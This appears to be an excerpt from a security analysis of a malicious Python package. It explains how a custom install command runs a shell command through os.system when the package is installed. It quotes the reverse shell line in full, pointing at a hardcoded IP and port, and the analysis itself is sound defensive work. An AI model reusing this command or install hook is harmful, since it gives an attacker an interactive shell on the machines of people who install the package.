It defines a custom installation command (CustomInstallCommand) for a Python package, which overrides the run() method to execute a shell command via os.system. The command 'bash -c 'bash -i >& /dev/tcp/114.116.119.253/7777 <&1'' is a classic reverse shell payload. When the package is installed (e.g., via pip), this code will automatically execute, causing the victim's machine to initiate an outbound connection to the attacker's server (114.116.119.253) on port 7777, providing the attacker with an interactive shell on the victim's system. This is a textbook example of a supply chain attack via a malicious Python package, enabling remote code execution and full system compromise without user consent or awareness. The use of a hardcoded external IP, lack of user interaction, and execution during installation are all strong indicators of malicious intent.",
